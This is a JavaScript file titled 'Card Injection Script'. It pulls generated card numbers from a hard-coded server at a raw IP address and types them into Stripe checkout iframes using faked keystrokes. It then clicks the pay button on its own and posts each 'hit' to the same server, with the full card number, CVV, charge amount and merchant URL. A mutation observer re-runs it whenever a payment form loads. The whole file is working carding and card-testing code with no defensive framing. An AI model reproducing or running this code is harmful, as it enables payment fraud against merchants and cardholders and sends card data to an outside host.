console.log("💳 Card Injection Script Loaded");

// Configuration
const INJECTION_CONFIG = {
    API: {
        BASE_URL: 'http://46.202.163.22:3000',
        ENDPOINTS: {
            BIN_INFO: '/bin/',
            HITS: '/api/hits'
        },
        TIMEOUT: 10000
    },
    SELECTORS: {
        STRIPE: {
            NUMBER: [
                'iframe[name*="__privateStripeFrame"][name*="card"]',
                'iframe[name*="__privateStripeElement"][name*="cardNumber"]',
                'input[data-elements-stable-field-name*="cardNumber"]'
            ],
            EXPIRY: [
                'iframe[name*="__privateStripeFrame"][name*="exp"]',
                'iframe[name*="__privateStripeElement"][name*="expiry"]',
                'input[data-elements-stable-field-name*="cardExpiry"]'
            ],
            CVC: [
                'iframe[name*="__privateStripeFrame"][name*="cvc"]',
                'iframe[name*="__privateStripeElement"][name*="cvc"]',
                'input[data-elements-stable-field-name*="cardCvc"]'
            ]
        },
        SUBMIT: [
            'button[type="submit"]',
            'button.SubmitButton',
            '[data-submit="true"]',
            'button:contains("Pay")',
            'button:contains("Subscribe")',
            '[data-testid*="submit"]'
        ],
        AMOUNT: [
            '[data-testid*="amount"]',
            '.Price',
            '.amount',
            '[class*="price"]',
            'span:contains("$")'
        ]
    },
    TIMING: {
        INITIAL_DELAY: 1000,
        FORM_CHECK_INTERVAL: 500,
        INJECTION_DELAY: 100,
        SUBMIT_DELAY: 1000,
        MAX_RETRIES: 3
    }
};

// Card Generation System
const CardSystem = {
    async generateCard(bin) {
        try {
            const response = await fetch(`${INJECTION_CONFIG.API.BASE_URL}${INJECTION_CONFIG.API.ENDPOINTS.BIN_INFO}${bin}`, {
                method: 'GET',
                headers: { 'Accept': 'application/json' },
                timeout: INJECTION_CONFIG.API.TIMEOUT
            });

            if (!response.ok) throw new Error('Card generation failed');

            const cardData = await response.json();
            if (!this.validateCard(cardData)) {
                throw new Error('Invalid card data received');
            }

            return cardData;
        } catch (error) {
            console.error('Card generation error:', error);
            return null;
        }
    },

    validateCard(card) {
        if (!card) return false;
        
        const { number, month, year, cvv } = card;
        const now = new Date();
        const currentYear = now.getFullYear();
        
        return (
            /^\d{16}$/.test(number) &&
            /^(0[1-9]|1[0-2])$/.test(month.toString()) &&
            parseInt(year) >= currentYear &&
            parseInt(year) <= currentYear + 10 &&
            /^\d{3,4}$/.test(cvv)
        );
    }
};

// Stripe Element Handler
const StripeHandler = {
    async injectIntoFrame(frame, value, fieldType) {
        try {
            const doc = frame.contentDocument || frame.contentWindow?.document;
            if (!doc) return false;

            const input = doc.querySelector('input[class*="InputElement"]');
            if (!input) return false;

            // Clear and focus
            input.focus();
            input.value = '';
            input.dispatchEvent(new Event('change', { bubbles: true }));

            // Inject character by character
            for (const char of value.toString()) {
                input.value += char;
                
                ['keydown', 'keypress', 'keyup', 'input', 'change'].forEach(eventType => {
                    input.dispatchEvent(new KeyboardEvent(eventType, {
                        key: char,
                        keyCode: char.charCodeAt(0),
                        which: char.charCodeAt(0),
                        bubbles: true,
                        cancelable: true
                    }));
                });

                await new Promise(r => setTimeout(r, INJECTION_CONFIG.TIMING.INJECTION_DELAY));
            }

            // Final events
            input.dispatchEvent(new Event('blur', { bubbles: true }));
            input.dispatchEvent(new CustomEvent('stripeElementUpdate', {
                bubbles: true,
                detail: { complete: true, value }
            }));

            return true;
        } catch (error) {
            console.warn(`Frame injection failed for ${fieldType}:`, error);
            return false;
        }
    },

    findPayButton() {
        for (const selector of INJECTION_CONFIG.SELECTORS.SUBMIT) {
            const button = document.querySelector(selector);
            if (button && button.offsetParent !== null) {
                return button;
            }
        }
        return null;
    },

    getAmount() {
        for (const selector of INJECTION_CONFIG.SELECTORS.AMOUNT) {
            const element = document.querySelector(selector);
            if (element) {
                const text = element.innerText;
                const match = text.match(/\$?\d+(\.\d{2})?/);
                if (match) return match[0].replace('$', '');
            }
        }
        return '0.00';
    },

    async submitPayment() {
        const button = this.findPayButton();
        if (!button) return false;

        button.click();
        return true;
    }
};

// Automated Payment Handler
const AutoPayment = {
    isProcessing: false,

    async start() {
        if (this.isProcessing) return;
        this.isProcessing = true;

        try {
            await this.waitForForm();
            const card = await CardSystem.generateCard("424242");
            
            if (!card) {
                throw new Error('Card generation failed');
            }

            console.log('💳 Generated card:', {
                number: card.number.replace(/(\d{6})\d{6}(\d{4})/, '$1******$2'),
                expiry: `${card.month}/${card.year}`,
                cvv: '***'
            });

            const success = await this.injectCardDetails(card);
            if (!success) throw new Error('Card injection failed');

            // Wait before submitting
            await new Promise(r => setTimeout(r, INJECTION_CONFIG.TIMING.SUBMIT_DELAY));
            
            const submitted = await StripeHandler.submitPayment();
            if (!submitted) throw new Error('Payment submission failed');

            // Record hit
            await this.recordHit(card);

            console.log('✅ Payment process completed');
        } catch (error) {
            console.error('❌ Payment process failed:', error);
        } finally {
            this.isProcessing = false;
        }
    },

    async waitForForm() {
        let attempts = 0;
        while (attempts < INJECTION_CONFIG.TIMING.MAX_RETRIES) {
            const frames = document.querySelectorAll('iframe[name*="__privateStripeFrame"]');
            if (frames.length > 0) return true;
            
            await new Promise(r => setTimeout(r, INJECTION_CONFIG.TIMING.FORM_CHECK_INTERVAL));
            attempts++;
        }
        throw new Error('Stripe form not found');
    },

    async injectCardDetails(card) {
        const frames = document.querySelectorAll('iframe');
        let success = { number: false, expiry: false, cvc: false };

        for (const frame of frames) {
            try {
                if (frame.name.includes('cardNumber') && !success.number) {
                    success.number = await StripeHandler.injectIntoFrame(frame, card.number, 'number');
                }
                else if (frame.name.includes('exp') && !success.expiry) {
                    const expiry = `${card.month.toString().padStart(2, '0')}${card.year.toString().slice(-2)}`;
                    success.expiry = await StripeHandler.injectIntoFrame(frame, expiry, 'expiry');
                }
                else if (frame.name.includes('cvc') && !success.cvc) {
                    success.cvc = await StripeHandler.injectIntoFrame(frame, card.cvv, 'cvc');
                }
            } catch (error) {
                console.warn('Frame injection error:', error);
            }
        }

        return Object.values(success).every(Boolean);
    },

    async recordHit(card) {
        try {
            const amount = StripeHandler.getAmount();
            await fetch(`${INJECTION_CONFIG.API.BASE_URL}${INJECTION_CONFIG.API.ENDPOINTS.HITS}`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    cardDetails: {
                        cardNumber: card.number,
                        expiryMonth: card.month,
                        expiryYear: card.year,
                        cvv: card.cvv
                    },
                    amount: amount,
                    businessUrl: window.location.href,
                    timestamp: new Date().toISOString()
                })
            });
        } catch (error) {
            console.error('Failed to record hit:', error);
        }
    }
};

// Form Observer
const FormObserver = {
    init() {
        // Start checking for form immediately
        setTimeout(() => AutoPayment.start(), INJECTION_CONFIG.TIMING.INITIAL_DELAY);

        // Watch for dynamic form loading
        const observer = new MutationObserver((mutations) => {
            mutations.forEach((mutation) => {
                if (mutation.addedNodes.length) {
                    const hasStripeFrame = Array.from(mutation.addedNodes).some(node => 
                        node.nodeType === 1 && (
                            node.matches?.('iframe[name*="__privateStripeFrame"]') ||
                            node.querySelector?.('iframe[name*="__privateStripeFrame"]')
                        )
                    );
                    
                    if (hasStripeFrame) {
                        AutoPayment.start();
                    }
                }
            });
        });

        observer.observe(document.body, {
            childList: true,
            subtree: true
        });
    }
};

// Initialize
FormObserver.init();
console.log("✅ Auto payment script ready");
